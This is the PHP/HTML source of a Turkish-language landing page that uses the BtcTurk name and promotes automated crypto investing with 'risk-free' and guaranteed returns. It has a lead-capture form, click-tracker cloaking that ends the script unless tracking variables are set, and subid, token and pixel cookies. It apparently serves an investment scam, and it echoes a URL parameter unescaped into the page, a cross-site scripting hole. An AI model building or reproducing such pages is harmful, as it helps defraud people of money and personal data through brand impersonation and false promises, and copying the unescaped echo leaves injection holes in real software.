<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>
<?php

include_once dirname(__FILE__) . '/config.php';

?>

<!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BtcTurk | Teknoloji</title>
    <link rel="stylesheet" href="./assets/css/styles.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
      rel="stylesheet"
    />
    <script src="form/js/libs/intlTelInput.js"></script>

        <script src="jquery-3.6.1.min.js"></script>
    <script src="form/js/libs/jquery.maskedinput.js"></script>
    <script src="form/js/libs/utils.js"></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>

    <!--PIXEL DEFENCE-->
    <?php if($FacebookPixel): ?>
    <script type="application/javascript">
      !(function (f, b, e, v, n, t, s) {
        if (f.fbq) return;
        n = f.fbq = function () {
          n.callMethod
            ? n.callMethod.apply(n, arguments)
            : n.queue.push(arguments);
        };
        if (!f._fbq) f._fbq = n;
        n.push = n;
        n.loaded = !0;
        n.version = "2.0";
        n.queue = [];
        t = b.createElement(e);
        t.async = !0;
        t.src = v;
        s = b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t, s);
      })(
        window,
        document,
        "script",
        "https://connect.facebook.net/en_US/fbevents.js"
      );
      fbq("init", "<?=$FacebookPixel ?>");
      fbq("track", "PageView");
    </script>
    <?php endif; ?>
  </head>
  <body>
    <header class="header">
      <img src="./assets/img/logo.svg" alt="Image" />
    </header>
    <main class="main">
      <section class="section hero">
        <div class="hero__content">
          <img src="./assets/img/hero.png"></img>
        </div>
        <div class="hero__form">
          <h1 class="form__preheading">
            İleri Finans Teknolojileri ile Yatırımlarınızı Kazanca Dönüştürün!
          </h1>
          <div class="form__wrapper">
            <h1 class="form__heading">Formu doldurun</h1>
            <form
              autocomplete="off"
              class="form _main-form register-form form-reg form-send"
              method="post"
              id="main-form"
            >
              <input type="hidden" id="source" value='<?= $_GET['source'] ?>'>
              <input type="hidden" name="comment" value="" />
              <input type="hidden" name="querys" />
            </form>
          </div>
        </div>
      </section>
      <section class="section stocks">
        <h2 class="stocks__heading">Karlılık Hesaplayıcı</h2>
        <div class="stocks__wrapper">
          <div class="stocks__calc">
            <label class="title">Kazanç sağlayacaksınız:</label>
            <input
              type="text"
              id="profit-display"
              class="profit-display"
              readonly
            />

            <div class="slider-container">
              <input
                type="range"
                id="range-slider"
                min="10000"
                max="100000"
                step="1"
                value="10000"
              />
              <div class="tick-marks">
                <span class="tick" style="left: 2%">10K</span>
                <span class="tick" style="left: 20%">25K</span>
                <span class="tick" style="left: 46%">50K</span>
                <span class="tick" style="left: 71%">75K</span>
                <span class="tick" style="left: 99%">100K</span>
              </div>
            </div>

            <div class="slider-container bottom">
              <label class="title sum">Yatırımlarınız</label>
              <input
                type="range"
                id="investment-slider"
                min="10"
                max="50"
                step="10"
                value="10"
              />
              <div class="tick-marks bottom">
                <span class="tick" style="left: 2%">10</span>
                <span class="tick" style="left: 27%">20</span>
                <span class="tick" style="left: 50%">30</span>
                <span class="tick" style="left: 73%">40</span>
                <span class="tick" style="left: 98%">50</span>
              </div>
            </div>
          </div>
          <div class="stocks__info">
            <div class="info__item">
              <div class="info--left">
                <img src="./assets/img/btc.svg" alt="Icon" />
                <span class="info__chart">BTC</span>
              </div>
              <span class="info--right">+ 21.7%</span>
            </div>
            <div class="info__item">
              <div class="info--left">
                <img src="./assets/img/btc.svg" alt="Icon" />
                <span class="info__chart">ETH</span>
              </div>
              <span class="info--right">+ 31.2%</span>
            </div>
            <div class="info__item">
              <div class="info--left">
                <img src="./assets/img/btc.svg" alt="Icon" />
                <span class="info__chart">AMCX</span>
              </div>
              <span class="info--right">+ 33.9%</span>
            </div>
            <div class="info__item">
              <div class="info--left">
                <img src="./assets/img/btc.svg" alt="Icon" />
                <span class="info__chart">SNP500</span>
              </div>
              <span class="info--right">+ 25.8%</span>
            </div>
            <div class="info__item">
              <div class="info--left">
                <img src="./assets/img/btc.svg" alt="Icon" />
                <span class="info__chart">Nike</span>
              </div>
              <span class="info--right">+ 37.1%</span>
            </div>
          </div>
        </div>
      </section>
      <section class="section benefits">
        <div class="benefits--top">
          <div class="benefits--left">
            <div class="benefits__item first">
              <div class="benefits__img first">
                <video src="./assets/img/flag.mp4" autoplay loop muted></video>
              </div>
              <div class="benefits__content first">
                <h3 class="benefits__heading first">
                  Kâra ve ileri teknolojiye tutku
                </h3>
                <p class="benefits__text first">
                  Yenilikçi algoritmalarımız, kullanıcıların risksiz kazanç elde
                  etmesini sağlar. Gelir elde etme süreçlerini otomatikleştirmek
                  ve yatırımları kolay ve şeffaf hale getirmek için
                  teknolojilerimizi sürekli geliştiriyoruz
                </p>
              </div>
            </div>
            <div class="benefits__item second">
              <div class="benefits__img second">
                <img src="./assets/img/lightning-m.png" alt="Image" />
              </div>
              <div class="benefits__content second">
                <h3 class="benefits__heading">
                  İstikrarlı kazanç için profesyonel ekip
                </h3>
                <p class="benefits__text second">
                  Uzman ekibimiz, yapay zeka ve kanıtlanmış stratejileri
                  kullanarak piyasayı gerçek zamanlı olarak analiz eder. Her
                  yatırımınızın kazanç getirmesi için çalışıyoruz, böylece aktif
                  katılım olmadan para kazanabilirsiniz
                </p>
              </div>
            </div>
          </div>
          <div class="benefits--right">
            <div class="benefits__item third">
              <div class="benefits__img third">
                <img src="./assets/img/lock.png" alt="Image" />
              </div>
              <div class="benefits__content third">
                <h3 class="benefits__heading">
                  Yatırımların güvenliği ve teknolojinin güvenilirliği
                </h3>
                <p class="benefits__text third">
                  Gelişmiş güvenlik protokollerimiz, sermayenizin tam
                  güvenliğini garanti eder. En yeni teknolojileri kullanarak
                  riskleri otomatik olarak yönetiyor ve kripto para
                  işlemlerinizin her aşamasında istikrarlı kazanç sağlıyoruz
                </p>
              </div>
            </div>
            <div class="benefits__item center">
              <div class="benefits__img center">
                <img src="./assets/img/tech.png" alt="Image" />
              </div>
              <div class="benefits__content center">
                <h3 class="benefits__heading">
                  Kripto yatırım ve blokzincir alanında uzmanlık
                </h3>
                <p class="benefits__text">
                  Yeni fırsatlar yaratıyoruz, gelişmiş algoritmalar ve
                  teknolojiler kullanarak pasif gelir elde etmenizi sağlıyoruz.
                  BtcTurk, kripto para piyasasındaki her işlemden otomatik
                  olarak kazanç sağlayarak yatırımları herkes için erişilebilir
                  kılıyor
                </p>
              </div>
            </div>
          </div>
        </div>
        <div class="benefits__item bottom">
          <div class="benefits__img bottom">
            <img src="./assets/img/crypto.png" alt="Image" />
          </div>
          <div class="benefits__content bottom">
            <h3 class="benefits__heading">
              Gelecek, sermayenizin sizin için çalıştığı bir dünya
            </h3>
            <p class="benefits__text">
              BtcTurk | Yatırımlar — finansal teknolojiler ve yüksek getirilerin
              birleşimidir. Kullanıcılarımıza, piyasa analizine zaman harcamadan
              kripto para işlemleri üzerinden kazanç elde etme imkanı sunuyoruz.
              Teknolojilerimiz, 7/24 sizin için çalışarak kripto piyasasını
              istikrarlı gelir kaynağına dönüştürüyor. Bugün kazanmaya başlayın!
            </p>
          </div>
        </div>
      </section>
    </main>
    <footer class="footer">
      <p class="footer__text">
        Tüm Hakları Saklıdır. © 2024 - BtcTurk | Teknoloji
      </p>
    </footer>
    <script src="./assets/js/main.js"></script>
    <script src="./assets/js/calc.js"></script>

    <script src="loadAssets.js?v=52"></script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
